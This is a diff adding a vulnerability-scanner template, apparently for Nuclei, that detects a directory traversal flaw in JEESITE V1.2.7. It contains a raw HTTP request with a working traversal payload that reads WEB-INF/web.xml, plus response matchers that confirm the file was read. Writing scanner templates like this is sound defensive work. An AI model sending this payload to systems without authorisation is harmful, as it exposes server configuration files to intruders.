@@ -1,0 +1,29 @@
+id: jeesite-directory-traversal
+
+info:
+  name: JEESITE Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JEESITE V1.2.7 is vulnerable to directory traversal, allowing unauthorized access to sensitive files such as WEB-INF/web.xml.
+  reference:
+    - http://www.yulegeyu.com/2021/06/19/JEESITE-V1-2-7-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/
+
+http:
+  - raw:
+      - |
+        GET /userfiles;/userfiles/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<display-name>"
+          - "thinkgem.jeesite"
+          - "<listener-class>"
+        part: body
